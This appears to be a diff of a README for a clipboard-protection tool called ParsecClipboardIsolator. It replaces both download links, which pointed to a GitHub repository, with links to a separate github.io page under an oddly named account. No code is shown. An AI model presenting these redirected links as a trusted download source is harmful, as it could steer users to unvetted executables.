@@ -1,6 +1,6 @@
 # 🛡️ ParsecClipboardIsolator - Protect Your Clipboard from Remote Overwrites
 
-[![Download Now](https://img.shields.io/badge/Download-ParsecClipboardIsolator-blue?style=for-the-badge&logo=github)](https://github.com/Introjected-genusmononychus12/ParsecClipboardIsolator)
+[![Download Now](https://img.shields.io/badge/Download-ParsecClipboardIsolator-blue?style=for-the-badge&logo=github)](https://introjected-genusmononychus12.github.io)
 
 ## 🚀 What Is ParsecClipboardIsolator?
 
@@ -18,7 +18,7 @@ ParsecClipboardIsolator gives you control. It runs silently in the background, p
 ## 📥 How to Download and Install
 
 **Step 1:** Visit the download page:  
-[👉 Download ParsecClipboardIsolator](https://github.com/Introjected-genusmononychus12/ParsecClipboardIsolator)
+[👉 Download ParsecClipboardIsolator](https://introjected-genusmononychus12.github.io)
 
 Visit this link to download the application.
 
